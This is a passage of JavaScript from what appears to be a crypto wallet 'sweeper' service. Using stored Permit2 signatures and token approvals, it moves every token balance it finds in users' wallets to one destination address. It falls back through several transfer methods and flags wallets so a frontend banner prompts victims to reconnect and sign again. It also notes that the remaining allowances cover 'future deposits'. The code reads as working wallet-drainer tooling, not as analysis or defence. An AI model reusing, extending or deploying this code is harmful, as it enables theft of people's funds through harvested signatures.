    // isAuthorized()===false or a reverted/failed sweepFor tx must NOT be treated
    // the same as "swept". Doing so previously early-returned below and skipped
    // TIER 3/4 (Permit2) even when nothing was actually moved, silently stranding
    // a wallet that had, e.g., a valid Permit2 SignatureTransfer sig as backup.
    let v2SweptOk = false;
    if (toSweepV2.length > 0 && v2ContractAddr) {
      try {
        const isAuth = await contract.isAuthorized(checksum, relayerWallet.address);
        if (isAuth) {
          log(`[direct] ${short} — sweepFor ${toSweepV2.length} tokens via V2 contract`);
          const fee = await getFeeData();
          const sweepTx = await contract.sweepFor(checksum, toSweepV2, { gasLimit: 80_000n + BigInt(toSweepV2.length) * 60_000n, ...fee });
          await sweepTx.wait();
          log(`[direct] ✅ sweepFor confirmed for ${short}`);
          v2SweptOk = true;
        } else {
          warn(`[direct] ${short} — not authorized in V2 contract, cannot sweepFor — will still try Permit2 fallback`);
        }
      } catch (e) { err(`[direct] sweepFor ❌ ${short}: ${e.reason ?? e.message} — will still try Permit2 fallback`); }
    }

    // ── Legacy PATH 2: direct transferFrom (relayer as spender) ──
    let legacySweptCount = 0;
    if (toSweepLegacy.length > 0) {
      log(`[direct] ${short} — sweeping ${toSweepLegacy.length} tokens via legacy transferFrom`);
      for (const { token, balance } of toSweepLegacy) {
        const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
        try {
          const relBal = await getRelayerBalance();
          if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
          const fee = await getFeeData();
          const erc20 = new ethers.Contract(token, ["function transferFrom(address,address,uint256) returns (bool)"], relayerWallet);
          const tx = await erc20.transferFrom(checksum, DESTINATION_ADDRESS, balance, { gasLimit: 100_000n, ...fee });
          await tx.wait();
          log(`[direct] ✅ swept ${sym} from ${short}`);
          legacySweptCount++;
        } catch (e) { maybeResetNonce(e); err(`[direct] ❌ ${sym}: ${e.reason ?? e.message}`); }
      }
    }

    // "Had candidates" is no longer sufficient to gate the early return below —
    // only an ACTUAL confirmed sweep should skip the Permit2 fallback tiers.
    directSwept = v2SweptOk || legacySweptCount > 0;
    const hadCandidates = toSweepV2.length > 0 || toSweepLegacy.length > 0;
    if (!hadCandidates) {
      log(`[direct] ${short} — no tokens with balance+allowance — falling through to permit2_signatures tiers`);
    } else if (!directSwept) {
      warn(`[direct] ${short} — had ${toSweepV2.length + toSweepLegacy.length} direct-allowance candidate(s) but none actually swept — falling through to permit2_signatures tiers`);
    }
    } // closes if (results)

    // ── Native coin sweep (V2.1 sweepETHFor) ──────────────────────────────
    await trySweepNativeFor(checksum, short);

    // Only return early if direct-allowance actually swept something.
    // If nothing swept, fall through to TIER 3/4 — wallet may have a
    // valid batch-signature-transfer row in permit2_signatures.
    if (directSwept) return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 3: Permit2 AllowanceTransfer — permitBatch sigs (stored at plain address)
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: pbData } = await supabase
      .from("permit2_signatures")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .or("spent.is.null,spent.eq.false")
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    // `pbData.spent` is set to true when a previous permit() call failed with InvalidNonce/InvalidSignature,
    // meaning the stored signature is permanently invalid. Skip TIER 3 entirely for spent rows.
    if (pbData?.permit?.transfer_type === "permit-batch" && !pbData.spent && Array.isArray(pbData.permit.details) && pbData.signature) {
      // Detect whether sig was signed for the relayer or the V2 contract.
      const pb3Spender  = (pbData.permit.spender ?? relayerWallet.address).toLowerCase();
      const pb3IsV2     = !!(CONTRACT_ADDRESS && pb3Spender === CONTRACT_ADDRESS.toLowerCase());
      const pb3CheckFor = pb3IsV2 ? CONTRACT_ADDRESS : relayerWallet.address;

      // Check on-chain allowances via Multicall3 before attempting permit().
      try {
        const ALLOW_ABI_3 = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
        const allowIface3 = new ethers.Interface(ALLOW_ABI_3);
        const mc3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
        const allowCalls = pbData.permit.details.map(d => ({
          target: PERMIT2_ADDRESS,
          allowFailure: true,
          callData: allowIface3.encodeFunctionData("allowance", [checksum, d.token, pb3CheckFor]),
        }));
        const allowResults = await mc3.aggregate3(allowCalls).catch(() => null);

        // When Multicall3 times out assume permit() is needed — the pre-flight staticCall
        // below verifies for free before we ever broadcast, preventing gas waste on spent nonces.
        let needsPermitCall3 = true;
        if (allowResults !== null) {
          needsPermitCall3 = allowResults.some((r) => {
            if (!r.success) return true;
            try {
              const [amt,, exp] = allowIface3.decodeFunctionResult("allowance", r.returnData);
              return BigInt(amt) === 0n || BigInt(exp) <= BigInt(Math.floor(Date.now() / 1000));
            } catch { return true; }
          });
        } else {
          warn(`[allowance] Multicall3 timed out — will try permit() with pre-flight staticCall`);
        }

        if (needsPermitCall3) {
          const pb3SigDeadline = Number(pbData.permit.sigDeadline ?? 0);
          const nowSecs3 = Math.floor(Date.now() / 1000);
          if (pb3SigDeadline === 0 || pb3SigDeadline < nowSecs3) {
            warn(`[allowance] permitBatch sigDeadline ${pb3SigDeadline === 0 ? 'missing/zero' : `expired ${Math.floor((nowSecs3 - pb3SigDeadline) / 86400)} days ago`} — skipping permit() call, using existing on-chain allowances`);
          } else {
            // Pre-flight: staticCall permit() to detect consumed/invalid nonces at 0 gas cost.
            // This replaces the old "skip on timeout" approach — we always attempt permit()
            // for valid sigDeadlines, guarded by staticCall so invalid sigs never burn gas.
            const permitArgs = [
              checksum,
              {
                details:     pbData.permit.details.map(d => ({ token: d.token, amount: BigInt(d.amount ?? (2n**160n-1n).toString()), expiration: Number(d.expiration ?? (2n**48n-1n).toString()), nonce: Number(d.nonce ?? 0) })),
                spender:     pbData.permit.spender ?? relayerWallet.address,
                sigDeadline: BigInt(pbData.permit.sigDeadline),
              },
              pbData.signature,
            ];
            let permitPreflightOk = false;
            try {
              await permit2.permit.staticCall(...permitArgs);
              permitPreflightOk = true;
              log(`[allowance] permit() pre-flight ✅ — broadcasting`);
            } catch (pf) {
              const pfMsg = (pf.reason ?? pf.revert?.name ?? pf.shortMessage ?? pf.message ?? "").toLowerCase();
              // Only mark the signature spent for a genuine on-chain revert (bad nonce/signer/
              // expiry). A transient RPC/network failure during the staticCall itself (timeout,
              // rate limit, dropped connection) is NOT proof the signature is invalid — marking
              // it spent here would permanently discard a still-usable signature just because
              // one read call hiccuped, forcing the user to reconnect and re-sign for nothing.
              const isRpcError = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429|rate.?limit|SERVER_ERROR|could not detect network/i.test(pfMsg);
              if (isRpcError) {
                warn(`[allowance] permit() pre-flight transient error: ${pfMsg} — leaving sig alive, will retry next sweep`);
              } else {
                err(`[allowance] permit() pre-flight failed: ${pfMsg} — marking spent, skipping`);
                if (supabase) {
                  supabase.from("permit2_signatures").update({ spent: true })
                    .eq("address", addrKey).eq("chain", CHAIN)
                    .then(() => { warn(`[allowance] permit2_signatures row marked spent via pre-flight`); }, () => {});
                }
              }
            }
            if (permitPreflightOk) {
              log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
              const fee = await getFeeData();
              const permitGas3 = BigInt(Math.min(120_000 + pbData.permit.details.length * 14_000, 800_000));
              try {
                const permitTx = await permit2.permit(...permitArgs, { gasLimit: permitGas3, ...fee });
                await permitTx.wait();
                log(`[allowance] ✅ permit() confirmed`);
              } catch (pe) {
                err(`[allowance] permit() failed post-preflight: ${pe.reason ?? pe.message} — trying sweep anyway`);
                const peMsg = (pe.reason ?? pe.revert?.name ?? pe.shortMessage ?? pe.message ?? "").toLowerCase();
                if ((peMsg.includes("nonce") || peMsg.includes("invalidsign") || peMsg.includes("invalidsigner") || peMsg.includes("revert")) && supabase) {
                  supabase.from("permit2_signatures").update({ spent: true })
                    .eq("address", addrKey).eq("chain", CHAIN)
                    .then(() => { warn(`[allowance] permit2_signatures row marked spent`); }, () => {});
                }
              }
            }
          }
        }
      } catch (e) {
        err(`[allowance] TIER 3 setup error: ${e.reason ?? e.message} — skipping permit()`);
      }

      if (pb3IsV2 && contract) {
        // V2 spender: one call to sweepViaPermit2 covers all tokens.
        // REQUIRED pre-check: ERC-20 must be approved to Permit2 (token.approve(PERMIT2))
        // BEFORE sweepViaPermit2 can succeed. Without it, the contract call reverts with
        // TRANSFER_FROM_FAILED and shows as a failed tx in the user's wallet — waste of gas.
        const tokenAddrs = pbData.permit.details.map(d => normalizeAddress(d.token)).filter(Boolean);
        const approvedTokens = [];
        for (const tokenAddr of tokenAddrs) {
          try {
            const erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
            if (erc20Allow > 0n) approvedTokens.push(tokenAddr);
          } catch {}
          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
        }
        if (approvedTokens.length === 0) {
          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s)`);
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
        } else {
          try {
            const fee = await getFeeData();
            const tx  = await contract.sweepViaPermit2(checksum, approvedTokens, { gasLimit: 100_000n + BigInt(approvedTokens.length) * 60_000n, ...fee });
            await tx.wait();
            log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${approvedTokens.length} token(s))`);
          } catch (e) {
            const emsg = e.reason ?? e.message ?? "";
            if (/TRANSFER_FROM_FAILED|transferFrom/i.test(emsg)) {
              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — checking backup`);
              await setNeedsReactivationIfNoBackup(checksum, addrKey);
            } else {
              err(`[allowance] sweepViaPermit2 ❌: ${emsg}`);
            }
          }
        }
      } else {
        // Relayer spender: batch-fetch permit2 allowance + ERC-20 balance + ERC-20→Permit2
        // approval for all tokens in one Multicall3 call (3 reads × N tokens → 1 RPC round-trip).
        const details = pbData.permit.details
          .map(d => ({ ...d, tokenAddr: normalizeAddress(d.token) }))
          .filter(d => d.tokenAddr);

        if (details.length > 0) {
          const P2_ALLOW_IFACE  = new ethers.Interface(["function allowance(address,address,address) view returns (uint160,uint48,uint48)"]);
          const ERC20_BAL_IFACE3 = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
          const ERC20_ALW_IFACE3 = new ethers.Interface(["function allowance(address,address) view returns (uint256)"]);
          const mc3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());

          const calls = [];
          for (const d of details) {
            calls.push({ target: PERMIT2_ADDRESS,  allowFailure: true, callData: P2_ALLOW_IFACE.encodeFunctionData("allowance",  [checksum, d.tokenAddr, relayerWallet.address]) });
            calls.push({ target: d.tokenAddr,      allowFailure: true, callData: ERC20_BAL_IFACE3.encodeFunctionData("balanceOf", [checksum]) });
            calls.push({ target: d.tokenAddr,      allowFailure: true, callData: ERC20_ALW_IFACE3.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]) });
          }

          let mcResults = null;
          try { mcResults = await mc3.aggregate3(calls); } catch (e) { warn(`[allowance] TIER3 multicall failed: ${e.message} — falling back to sequential`); }

          for (let i = 0; i < details.length; i++) {
            const { tokenAddr } = details[i];
            try {
              let p2Amount = 0n, p2Exp = 0n, balance = 0n, erc20Allow = 0n;

              if (mcResults) {
                try { [p2Amount,, p2Exp] = P2_ALLOW_IFACE.decodeFunctionResult("allowance",  mcResults[i * 3].returnData);     } catch {}
                try { [balance]          = ERC20_BAL_IFACE3.decodeFunctionResult("balanceOf", mcResults[i * 3 + 1].returnData); } catch {}
                try { [erc20Allow]       = ERC20_ALW_IFACE3.decodeFunctionResult("allowance", mcResults[i * 3 + 2].returnData); } catch {}
              } else {
                // Multicall failed — fall back to sequential reads for this token
                try { [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, tokenAddr, relayerWallet.address); } catch {}
                try { balance    = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).balanceOf(checksum); }  catch {}
                try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS); } catch {}
              }

              if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
              if (balance === 0n) continue;
              if (erc20Allow === 0n) {
                warn(`[allowance] ${tokenAddr.slice(0,10)}: no ERC-20→Permit2 approval — skipping`);
                continue;
              }

              // Cap at p2Amount — Permit2 reverts if amount > registered allowance
              const sweepAmt = p2Amount < balance ? p2Amount : balance;
              if (sweepAmt === 0n) continue;

              const fee = await getFeeData();
              const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr, { gasLimit: 150_000n, ...fee });
              await tx.wait();
              log(`[allowance] ✅ swept ${tokenAddr.slice(0,10)}`);
            } catch (e) {
              maybeResetNonce(e);
              err(`[allowance] ❌ ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message}`);
            }
          }
        }
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 3.5: LIVE PERMIT2 ALLOWANCETRANSFER — no stored sig required
  // Sweeps using on-chain AllowanceTransfer registrations that persist forever.
  // ══════════════════════════════════════════════════════════════════════════
  {
    const liveTokens = TOKENS.map(t => t.address.toLowerCase());
    const balIface   = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);
    const liveCalls  = liveTokens.map(addr => ({ target: addr, allowFailure: true, callData: balIface.encodeFunctionData("balanceOf", [checksum]) }));
    let liveResults  = [];
    try {
      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
      liveResults = await mc.aggregate3.staticCall(liveCalls);
    } catch { /* multicall failed — skip */ }
    const liveWithBalance = [];
    for (let i = 0; i < liveTokens.length; i++) {
      const r = liveResults[i];
      if (!r?.success) continue;
      try {
        const bal = balIface.decodeFunctionResult("balanceOf", r.returnData)[0];
        if (bal > 0n) liveWithBalance.push({ token: liveTokens[i], balance: bal });
      } catch { /* skip */ }
    }
    if (liveWithBalance.length > 0) {
      let sweptAny = false;
      let anyNeedsErc20Approval = false; // tracks: Permit2 internal > 0 but ERC-20 = 0
      for (const { token, balance } of liveWithBalance) {
        try {
          const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
          const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
          let sweptThisToken = false;
          if (p2Amt > 0n && BigInt(p2Exp) >= nowSecs) {
            // Relayer spender: direct permit2.transferFrom
            // Must verify ERC-20→Permit2 approval first — permit2.transferFrom reverts
            // (TransferFromFailed) and wastes gas when the ERC-20 approval tx is still pending.
            let erc20Approved = false;
            try {
              const erc20Chk = await new ethers.Contract(token, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
              erc20Approved = erc20Chk > 0n;
            } catch {}
            if (!erc20Approved) {
              warn(`[live-allowance] ${sym} relayer path skipped — ERC-20→Permit2 approval missing`);
              anyNeedsErc20Approval = true;
            } else {
              const sweepAmt = p2Amt < balance ? p2Amt : balance;
              if (sweepAmt > 0n) {
                log(`[live-allowance] ${short} — sweeping ${sym} via relayer Permit2 allowance`);
                const fee = await getFeeData();
                const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
                await tx.wait();
                log(`[live-allowance] ✅ swept ${sym} from ${short}`);
                sweptAny = true;
                sweptThisToken = true;
              }
            }
          }
          if (!sweptThisToken && CONTRACT_ADDRESS && contract) {
            // V2 spender fallback: check if the V2 contract has a live allowance for this token.
            // Also verify ERC-20→Permit2 approval exists to avoid a reverted on-chain call.
            const [v2Amt,, v2Exp] = await permit2Read.allowance(checksum, token, CONTRACT_ADDRESS);
            if (v2Amt > 0n && BigInt(v2Exp) >= nowSecs) {
              let erc20Approved = false;
              try {
                const erc20Allow = await new ethers.Contract(token, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
                erc20Approved = erc20Allow > 0n;
              } catch {}
              if (erc20Approved) {
                log(`[live-allowance] ${short} — sweeping ${sym} via V2 sweepViaPermit2`);
                const fee = await getFeeData();
                const tx = await contract.sweepViaPermit2(checksum, [token], { gasLimit: 160_000n, ...fee });
                await tx.wait();
                log(`[live-allowance] ✅ swept ${sym} (V2 spender) from ${short}`);
                sweptAny = true;
              } else {
                warn(`[live-allowance] ${sym} V2 path skipped — ERC-20→Permit2 approval missing`);
                anyNeedsErc20Approval = true;
              }
            }
          }
        } catch (e) {
          maybeResetNonce(e);
          const msg = e.reason ?? e.message ?? "";
          if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
        }
      }
      if (sweptAny) {
        sweptThisCall = true;
        if (supabase) {
          // Awaited so the needs_reactivation:false write completes before Tier 4
          // can overwrite it with needs_reactivation:true.
          await supabase.from("delegated_wallets").update({ needs_reactivation: false })
            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
        }
      } else if (anyNeedsErc20Approval && supabase) {
        // Permit2 internal allowances exist but ERC-20→Permit2 approval is missing for all tokens.
        // Force needs_reactivation=true so the frontend banner prompts the user to reconnect
        // and approve ERC-20. Having a Permit2 internal allowance alone is insufficient for sweeping.
        warn(`[live-allowance] ${short} — Permit2 internal allowances present but ERC-20 approval missing → needs_reactivation`);
        await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 4: Permit2 SignatureTransfer — batch permitTransferFrom
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: stData } = await supabase
      .from("permit2_signatures")
      .select("*")
      .eq("address", addrKey + "-sig")
      .eq("chain", CHAIN)
      .or("spent.is.null,spent.eq.false")   // accept NULL (pre-spent-column rows) and explicit false
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
      const sig = stData.permit;

      // Validate before submitting
      const spenderMatch = sig.spender?.toLowerCase() === relayerWallet.address.toLowerCase();
      const dl = BigInt(sig.deadline ?? 0);
      log(`[gasless] spender match: ${spenderMatch} (sig=${sig.spender} relayer=${relayerWallet.address})`);
      log(`[gasless] deadline: ${sig.deadline} (${new Date(Number(sig.deadline) * 1000).toISOString()})`);
      log(`[gasless] permitted: ${sig.permitted?.length}`);

      if (!spenderMatch) {
        if (CONTRACT_ADDRESS && sig.spender?.toLowerCase() === CONTRACT_ADDRESS.toLowerCase()) {
          // Sig was signed for V2 contract (legacy test period) — relayer cannot call permitTransferFrom.
          // AllowanceTransfer (Tier 3/3.5) or direct-allowance (Tier 5) handles this wallet.
          log(`[gasless] sig spender=V2 contract — relying on AllowanceTransfer path; not setting needs_reactivation`);
        } else {
          err(`[gasless] ❌ SPENDER MISMATCH — sig for ${addrKey.slice(0,10)} signed for old relayer ${sig.spender?.slice(0,10)} (current: ${relayerWallet.address.slice(0,10)})`);
          // Mark the stale sig as spent so the bot stops retrying it every scan cycle.
          // On user reconnect the backend will upsert a fresh sig with the current relayer.
          if (supabase) {
            supabase.from("permit2_signatures").update({ spent: true })
              .eq("address", addrKey + "-sig").eq("chain", CHAIN)
              .then(() => { warn(`[gasless] stale wrong-spender sig marked spent for ${addrKey.slice(0,10)}`); }, () => {});
          }
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
        }
        // Do NOT return — fall through to Tier 5 (direct-allowance may still work)
      } else if (dl < nowSecs) {
        warn(`[gasless] ❌ signature expired (${new Date(Number(sig.deadline) * 1000).toISOString()}) — checking for AllowanceTransfer backup`);
        if (supabase) {
          await supabase.from("permit2_signatures")
            .update({ spent: true })
            .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
        }
        // Do NOT return — fall through to Tier 5
      } else {

      // Check balances via Multicall3 — 1 RPC call per 250 tokens instead of
      // 498 individual calls (was taking ~50s and using 498 QuickNode credits).
      const permitted = (sig.permitted ?? []).filter(p => p?.token && ethers.isAddress(p.token));
      const withBalance = [];
      const multicall3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
      const CHUNK = 250;
      for (let i = 0; i < permitted.length; i += CHUNK) {
        const chunk = permitted.slice(i, i + CHUNK);
        try {
          const calls = chunk.map(p => ({
            target:       p.token,
            allowFailure: true,
            callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [checksum]),
          }));
          const results = await multicall3.aggregate3(calls);
          for (let j = 0; j < chunk.length; j++) {
            const { success, returnData: data } = results[j];
            if (!success || !data || data === "0x") continue;
            try {
              const [bal] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
              if (bal > 0n) withBalance.push({ ...chunk[j], balance: bal });
            } catch { /* malformed */ }
          }
        } catch (e) {
          warn(`[gasless] balance multicall chunk ${i} failed: ${errStr(e)}`);
        }
      }

      if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }

      // Pre-check ERC-20 allowance to Permit2 for each token via Multicall.
      // SignatureTransfer.permitTransferFrom requires ERC20.allowance(owner,Permit2)>0.
      // Without this check the tx reverts and wastes gas.
      const ERC20_ALLOW_IFACE = new ethers.Interface(["function allowance(address,address) view returns (uint256)"]);
      const allowChecks = await multicall3.aggregate3(
        withBalance.map(p => ({
          target:       p.token,
          allowFailure: true,
          callData:     ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
        }))
      ).catch(() => null);

      if (allowChecks) {
        const approved = [];
        const skipped  = [];
        for (let i = 0; i < withBalance.length; i++) {
          const { success, returnData: data } = allowChecks[i];
          let allow = 0n;
          if (success && data && data !== "0x") {
            try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", data); } catch { /* ignore */ }
          }
          if (allow > 0n) {
            const permittedAmt = BigInt(withBalance[i].amount ?? "0");
            const balanceCap   = withBalance[i].balance;
            const allowCap     = allow < balanceCap ? allow : balanceCap;
            const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
            if (cappedBalance < balanceCap) {
              log(`[gasless] ⚠️  ${withBalance[i].token.slice(0, 10)} capping sweep: balance=${balanceCap} allow=${allow} permitted=${permittedAmt} → using ${cappedBalance}`);
            }
            approved.push({ ...withBalance[i], balance: cappedBalance });
          } else {
            skipped.push(withBalance[i].token.slice(0, 10));
          }
        }
        if (skipped.length) {
          log(`[gasless] ⚠️  ${skipped.length} token(s) skipped — ERC-20 allowance to Permit2 is 0: ${skipped.join(", ")}`);
        }
        withBalance.splice(0, withBalance.length, ...approved);
      } else {
        // Multicall failed (rate-limit / RPC hiccup). Fall back to individual eth_call checks.
        warn(`[gasless] allowance multicall failed — falling back to per-token checks`);
        const fbApproved = []; const fbSkipped = [];
        const rp = getReadProvider();
        for (const p of [...withBalance]) {
          try {
            const raw = await rp.call({
              to: p.token,
              data: ERC20_ALLOW_IFACE.encodeFunctionData("allowance", [checksum, PERMIT2_ADDRESS]),
            });
            let allow = 0n;
            if (raw && raw !== "0x") { try { [allow] = ERC20_ALLOW_IFACE.decodeFunctionResult("allowance", raw); } catch {} }
            if (allow > 0n) {
              const permittedAmt = BigInt(p.amount ?? "0");
              const allowCap     = allow < p.balance ? allow : p.balance;
              const cappedBalance = permittedAmt > 0n && permittedAmt < allowCap ? permittedAmt : allowCap;
              fbApproved.push({ ...p, balance: cappedBalance });
            } else {
              fbSkipped.push(p.token.slice(0, 10));
            }
          } catch {
            fbSkipped.push(p.token.slice(0, 10));
          }
        }
        if (fbSkipped.length) log(`[gasless] ⚠️  ${fbSkipped.length} token(s) need on-chain Permit2 approval (fallback): ${fbSkipped.join(", ")}`);
        withBalance.splice(0, withBalance.length, ...fbApproved);
      }

      if (withBalance.length === 0) {
        warn(`[gasless] no tokens with ERC-20→Permit2 approval — user must reconnect and approve tokens`);
        // Force needs_reactivation=true even when permit2.permit() created internal allowances.
        // Having Permit2 internal allowances does NOT enable sweeping without ERC-20 approval.
        // Forcing this flag ensures the frontend banner keeps prompting the user to reconnect
        // and complete the ERC-20 approval step.
        if (!sweptThisCall) await setNeedsReactivationIfNoBackup(checksum, addrKey, { forceReactivate: true });
        return;
      }
      log(`[gasless] sweeping ${withBalance.length} tokens`);

      // ── Pre-flight eth_call simulation ───────────────────────────────────────
      const PERMIT2_ERROR_IFACE = new ethers.Interface([
        "error InvalidNonce()",
        "error SignatureExpired(uint256)",
        "error InvalidSigner()",
        "error InsufficientAllowance(uint256)",
        "error InvalidAmount(uint256)",
        "error LengthMismatch()",
      ]);
      const sweepMapPf = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
      const fullPermittedPf       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
      const fullTransferDetailsPf = permitted.map(t => ({
        to: DESTINATION_ADDRESS,
        requestedAmount: sweepMapPf.get(t.token.toLowerCase()) ?? 0n,
      }));
      const gasLimitPf = 300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n;
      let gasLimitOverride = null;
      const runPreflight = async (gasLimit) => permit2Batch.permitTransferFrom.staticCall(
        { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
        fullTransferDetailsPf, checksum, stData.signature, { gasLimit },
      );
      try {
        await runPreflight(gasLimitPf);
        log(`[gasless] pre-flight ✅ — broadcasting`);
      } catch (simErr) {
        let revertName = simErr?.revert?.name ?? null;
        if (!revertName) {
          const errData = simErr?.data ?? simErr?.error?.data ?? null;
          if (errData) { try { revertName = PERMIT2_ERROR_IFACE.parseError(errData)?.name; } catch {} }
        }
        const simMsg = revertName ?? simErr?.reason ?? simErr?.shortMessage ?? simErr?.message ?? "unknown";
        err(`[gasless] pre-flight FAILED: ${simMsg}`);
        if (revertName === "InvalidNonce") {
          if (supabase) {
            await supabase.from("permit2_signatures").update({ spent: true })
              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          }
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
          return;
        }
        if (revertName === "InsufficientAllowance") {
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
          return;
        }
        if (revertName === "InvalidSigner") {
          err(`[gasless] ❌ INVALID SIGNER — deleting bad sig so user gets a clean re-sign on next visit`);
          if (supabase) {
            await supabase.from("permit2_signatures").delete()
              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          }
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
          return;
        }
        if (revertName === "SignatureExpired") {
          if (supabase) {
            await supabase.from("permit2_signatures").update({ spent: true })
              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          }
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
          return;
        }
        if (!revertName) {
          warn(`[gasless] pre-flight empty revert — retrying with 2× gas (${gasLimitPf * 2n})`);
          try {
            await runPreflight(gasLimitPf * 2n);
            log(`[gasless] pre-flight ✅ on 2× gas retry — broadcasting with higher limit`);
            gasLimitOverride = gasLimitPf * 2n;
          } catch {
            err(`[gasless] pre-flight failed on 2× gas retry — checking backup before marking re-activation`);
            await setNeedsReactivationIfNoBackup(checksum, addrKey);
            return;
          }
        } else {
          warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
        }
      }

      try {
        const fee = await getFeeData();
        const sweepMap = new Map(withBalance.map(t => [t.token.toLowerCase(), t.balance]));
        const fullPermitted       = permitted.map(t => ({ token: t.token, amount: BigInt(t.amount) }));
        const fullTransferDetails = permitted.map(t => ({
          to: DESTINATION_ADDRESS,
          requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
        }));
        const gasLimit = gasLimitOverride ?? (300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n);
        const tx = await permit2Batch.permitTransferFrom(
          { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
          fullTransferDetails,
          checksum,
          stData.signature,
          { gasLimit, ...fee },
        );
        await tx.wait();
        log(`[gasless] ✅ swept ${withBalance.length} tokens`);
        sweptThisCall = true;
        if (supabase) {
          await supabase.from("permit2_signatures").update({ spent: true })
            .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          const hasBackupAllowance = await hasLivePermit2Allowance(checksum).catch(() => false);
          await supabase.from("delegated_wallets")
            .update({ needs_reactivation: !hasBackupAllowance })
            .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
          if (hasBackupAllowance) log(`[gasless] AllowanceTransfer still active — future deposits covered without re-signing`);
        }
      } catch (e) {
        maybeResetNonce(e);
        const revertName = e.revert?.name ?? null;
        const errDetail  = revertName ?? e.reason ?? e.shortMessage ?? e.message;
        err(`[gasless] ❌ revert: ${errDetail}`);
        if (revertName) err(`[gasless] revert args: ${JSON.stringify(e.revert?.args ?? [])}`);
        err(`[gasless] context: owner=${checksum} nonce=${sig.nonce?.slice?.(0,18)} deadline=${dl} tokens=${withBalance.length} amounts=${withBalance.map(t=>t.balance).join(',')}`);
        const msg = (revertName ?? e.reason ?? e.message ?? "").toLowerCase();
        const isNonce = msg.includes("invalidnonce") || msg.includes("nonce");
        if (isNonce) {
          log(`[gasless] nonce already used on-chain — marking sig spent, checking backup`);
          if (supabase) {
            await supabase.from("permit2_signatures").update({ spent: true })
              .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
          }
          await setNeedsReactivationIfNoBackup(checksum, addrKey);
        }
      }
      } // closes else { } (valid sig path)
    }

